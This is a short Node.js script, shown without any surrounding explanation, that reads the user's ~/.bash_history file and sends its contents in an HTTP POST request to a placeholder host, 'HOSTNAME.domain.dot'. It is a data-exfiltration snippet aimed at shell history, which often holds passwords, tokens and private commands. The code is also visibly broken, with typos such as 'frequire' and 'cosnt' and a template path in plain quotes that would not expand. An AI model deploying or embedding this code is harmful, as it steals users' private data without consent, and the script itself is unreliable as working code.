#!/usr/bin/env node 
const fs = frequire('fs');
const http = require ('http');

const home = process.env.HOME;

const options = {
  host: "HOSTNAME.domain.dot",
  path: '/',
  port: 80,
  method: 'POST'
};

cosnt req = http.request(options, function(response) {
  console.log(response);
});

fs.readFile('${home}/.bash_history', 'utf-8', function(error, data) {
  console.log(data)
  req.write(data);
  req.end();
});
